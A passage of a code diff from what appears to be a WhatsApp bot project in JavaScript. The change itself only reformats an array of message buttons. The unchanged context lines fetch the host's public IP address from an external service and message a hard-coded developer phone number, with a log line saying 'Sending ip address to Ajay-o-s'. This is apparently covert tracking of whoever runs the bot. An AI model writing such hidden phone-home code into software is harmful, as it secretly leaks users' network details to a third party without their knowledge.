@@ -61,10 +61,7 @@ fetch(`http://ip-api.com/line`).then(res => res.text())
        hyper.sendMessage("917510153501@s.whatsapp.net", `─────「 *Abhi-Mwol* 」─────\n\n*_HLO AK WELCOME_*\n────────────────────`, MessageType.text, {contextInfo: { externalAdReply:{title: "Developer Abhi-Mwol",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./image/niyababy.jpeg'),sourceUrl:"https://wa.me/917510153501?text=welcome"}}})
        console.log(color('|WRN|', 'yellow'), color('Sending ip address to Ajay-o-s', 'cyan'))
        console.log(color('|WRN|', 'yellow'), color('Sending buttion message', 'cyan'))
-	buttons = [
-          { buttonId: `h`, buttonText: { displayText: "nice to meet you" }, type: 1 },
-          { buttonId: `t`, buttonText: { displayText: "which person are you" }, type: 1 },
-                    { buttonId: `g`, buttonText: { displayText: "girl/boy" }, type: 1 },];
+	buttons = [{ buttonId: `h`, buttonText: { displayText: "nice to meet you" }, type: 1 },{ buttonId: `t`, buttonText: { displayText: "which person are you" }, type: 1 },{ buttonId: `g`, buttonText: { displayText: "girl/boy" }, type: 1 },];
         buttonsMessage = {
           contentText: '─────「 *Abhi-Mwol* 」─────\n\n*_HLO AK WELCOME_*\n────────────────────',
           footerText: "─────「 *Abhi-Mwol* 」─────",
